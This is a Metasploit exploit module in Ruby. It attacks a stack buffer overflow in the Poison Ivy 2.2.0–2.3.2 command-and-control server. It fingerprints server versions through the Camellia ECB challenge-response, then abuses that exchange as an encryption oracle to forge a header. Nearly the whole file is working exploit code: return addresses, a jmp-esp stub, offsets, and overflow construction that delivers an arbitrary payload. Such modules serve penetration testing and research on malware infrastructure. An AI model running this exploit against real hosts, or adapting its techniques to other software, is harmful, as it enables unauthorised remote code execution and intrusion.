##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => "Poison Ivy Server Buffer Overflow",
      'Description'    => %q{
        This module exploits a stack buffer overflow in the Poison Ivy 2.2.0 to 2.3.2 C&C server.
        The exploit does not need to know the password chosen for the bot/server communication.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Andrzej Dereszowski', # Vulnerability Discovery
          'Gal Badishi', # Exploit and Metasploit module
          'juan vazquez', # Testing and little of Metasploit-fu
          'Jos Wetzels' # Added support for Poison Ivy 2.2.0 to 2.3.1, removed need for bruteforcing by (ab)using C&C challenge-response as encryption oracle
        ],
      'References'     =>
        [
          [ 'OSVDB', '83774' ],
          [ 'EDB', '19613' ],
          [ 'URL', 'http://www.signal11.eu/en/research/articles/targeted_2010.pdf' ],
          [ 'URL', 'http://badishi.com/own-and-you-shall-be-owned' ],
          [ 'URL', 'http://samvartaka.github.io/malware/2015/09/07/poison-ivy-reliable-exploitation/' ],
        ],
      'DisclosureDate' => "Jun 24 2012",
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'thread',
        },
      'Payload'        =>
        {
          'StackAdjustment'   => -4000,
          'Space'             => 10000,
          'BadChars'          => "",
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          [
            'Poison Ivy 2.2.0 on Windows XP SP3 / Windows 7 SP1',
            {
              'Ret' => 0x00425E5D, # jmp esp from "Poison Ivy 2.2.0.exe"
              'RWAddress' => 0x00401000,
              'Offset' => 0x8069,
              'PayloadOffset' => 0x75,
              'jmpPayload' => "\x81\xec\xFC\x7F\x00\x00\xff\xe4" # sub esp,0x7FFC # jmp esp
            }
          ],

          [
            'Poison Ivy 2.3.0 on Windows XP SP3 / Windows 7 SP1',
            {
              'Ret' => 0x00442749, # jmp esp from "Poison Ivy 2.3.0.exe"
              'RWAddress' => 0x00401000,
              'Offset' => 0x8069,
              'PayloadOffset' => 0x75,
              'jmpPayload' => "\x81\xec\xFC\x7F\x00\x00\xff\xe4" # sub esp,0x7FFC # jmp esp
            }
          ],

          [
            'Poison Ivy 2.3.1, 2.3.2 on Windows XP SP3 / Windows 7 SP1',
            {
              'Ret' => 0x0041AA97, # jmp esp from "Poison Ivy 2.3.1.exe" and "Poison Ivy 2.3.2.exe"
              'RWAddress' => 0x00401000,
              'Offset' => 0x806D,
              'PayloadOffset' => 0x75,
              'jmpPayload' => "\x81\xec\x00\x80\x00\x00\xff\xe4" # sub esp,0x8000 # jmp esp
            }
          ]
        ],
      'DefaultTarget'  => 2
    ))

    register_options(
            [
              Opt::RPORT(3460),
            ], self.class)

  end

  def check
    # camellia block size
    blockSize = 16
    # number of blocks in challenge
    blockCount = 16
    challenge = ("\x00" * blockSize * blockCount)

    indicator = Hash.new
    # 0x0000113e as first 4 bytes on PI 2.1.0
    indicator[[0x0000113e].pack("V")] = '2.1.0'
    # 0x00001212 as first 4 bytes on PI 2.1.1
    indicator[[0x00001212].pack("V")] = '2.1.1'
    # 0x000013f6 as first 4 bytes on PI 2.1.2
    indicator[[0x000013f6].pack("V")] = '2.1.2'

    # 0x000013e0 as 4 bytes after challenge on PI 2.2.0
    indicator[[0x000013e0].pack("V")] = '2.2.0'
    # 0x00001470 as 4 bytes after challenge on PI 2.3.0
    indicator[[0x00001470].pack("V")] = '2.3.0'
    # 0x000015D0 as 4 bytes after challenge on PI 2.3.1/2.3.2
    indicator[[0x000015D0].pack("V")] = '2.3.1/2.3.2'

    connect
    sock.put(challenge)
    response = sock.read(256)

    if response.length == 256
      response2 = sock.read(4)
      disconnect

      # Poison Ivy >= 2.2.0 Challenge Response uses Camellia in ECB mode which means identical plaintext blocks
      # map to identical ciphertext blocks. A challenge composed of identical blocks will thus result in a response of identical blocks.
      firstBlock = response[0, 16]
      for index in 1..15
        if response[index * 16, 16] != firstBlock
          print_status("Response doesn't match Poison Ivy Challenge-Response format.")
          return Exploit::CheckCode::Safe
        end
      end

      if indicator.key?(response2)
        indic = indicator[response2]
        print_status("Vulnerable Poison Ivy C&C version #{indic} detected.")
        return Exploit::CheckCode::Appears
      end
    elsif response.length == 4
      disconnect
      if indicator.key?(response)
        indic = indicator[response]
        print_status("Poison Ivy C&C version #{indic} detected.")
        return Exploit::CheckCode::Safe
      end
    end

    vprint_status("Response doesn't match Poison Ivy Challenge-Response protocol.")
    return Exploit::CheckCode::Safe
  end

  def exploit
    # Handshake
    connect
    print_status("Performing handshake...")

    # plaintext header
    plaintextHeader = "\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x01\x00\xbb\x00\x00\x00\xc2\x00\x00\x00\xc2\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"

    # crafted challenge (first 32 bytes is our plaintext header), abuse challenge-response as encryption oracle
    challenge = plaintextHeader + ("\x00" * (256 - 32))
    sock.put(challenge)
    # response = encrypt(challenge, key)
    response = sock.get_once

    # since encryption is done using Camellia in ECB mode, we can cut and paste the first 32 bytes (our header inside the crafted challenge) without knowing the key
    encryptedHeader = response[0, 32]

    # Don't change the nulls, or it might not work
    xploit  = ''
    xploit << encryptedHeader
    xploit << "\x00" * (target['PayloadOffset'] - xploit.length)
    xploit << payload.encoded
    xploit << "\x00" * (target['Offset'] - xploit.length)
    xploit << [target.ret].pack("V") # ret to a jmp esp opcode
    xploit << [target['RWAddress']].pack("V") # Readable/writeable - will be cleaned by original ret 4 (esp will point to the next dword)
    xploit << target['jmpPayload'] # This comes immediately after ret - it is a setup for the payload (jmp back)

    # The disconnection triggers the exploit
    print_status("Sending exploit...")
    sock.put(xploit)
    select(nil,nil,nil,5)
    disconnect
  end

end

=begin

* ROP version of exploit(): Has been discarded at the moment because of two reasons:

(1) Poison Ivy fails to run on DEP enabled systems (maybe due to the unpacking process)
(2) When trying a unpacked version on DEP enabled systems windows/exec payload runs, but not meterpreter

=end
